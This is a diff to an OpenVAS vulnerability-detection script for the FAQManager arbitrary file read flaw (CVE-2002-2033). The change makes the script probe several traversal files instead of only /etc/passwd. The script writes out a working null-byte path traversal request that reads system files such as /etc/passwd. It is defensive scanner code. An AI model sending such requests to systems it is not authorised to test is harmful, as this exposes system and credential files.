@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: faqmanager.nasl 10818 2018-08-07 14:03:55Z cfischer $
+# $Id: faqmanager.nasl 11751 2018-10-04 12:03:41Z jschulte $
 #
 # FAQManager Arbitrary File Reading Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.10837");
-  script_version("$Revision: 10818 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-07 16:03:55 +0200 (Tue, 07 Aug 2018) $");
+  script_version("$Revision: 11751 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-04 14:03:41 +0200 (Thu, 04 Oct 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_cve_id("CVE-2002-2033");
   script_bugtraq_id(3810);
@@ -38,36 +38,48 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2002 Matt Moore");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name:"solution", value:"A new version of FAQManager is available at: www.fourteenminutes.com/code/faqmanager/");
+  script_tag(name:"solution", value:"Update to a newer version of FAQManager.");
 
   script_tag(name:"summary", value:"FAQManager is a Perl-based CGI for maintaining a list of Frequently asked Questions.
   Due to poor input validation it is possible to use this CGI to view arbitrary files on the web server. For example:
 
-  http://www.someserver.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00");
+  someserver.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
+
+  script_xref(name:"URL", value:"www.fourteenminutes.com/code/faqmanager/");
 
   exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 host = http_host_name(dont_add_port:TRUE);
 if(get_http_no404_string(port:port, host:host))exit(0);
 
-url = "/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00";
-req = http_get(item:url, port:port);
-r = http_keepalive_send_recv(port:port, data:req);
+files = traversal_files();
 
-if(egrep(pattern:"root:.*:0:[01]:.*", string:r, icase:TRUE)) {
-  report = report_vuln_url(port:port, url:url);
-  security_message(port:port, data:report);
-  exit(0);
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  url = "/cgi-bin/faqmanager.cgi?toc=/" + file + "%00";
+  req = http_get(item:url, port:port);
+  r = http_keepalive_send_recv(port:port, data:req);
+
+  if(egrep(pattern:pattern, string:r, icase:TRUE)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
+    exit(0);
+  }
 }
+
+exit(99);
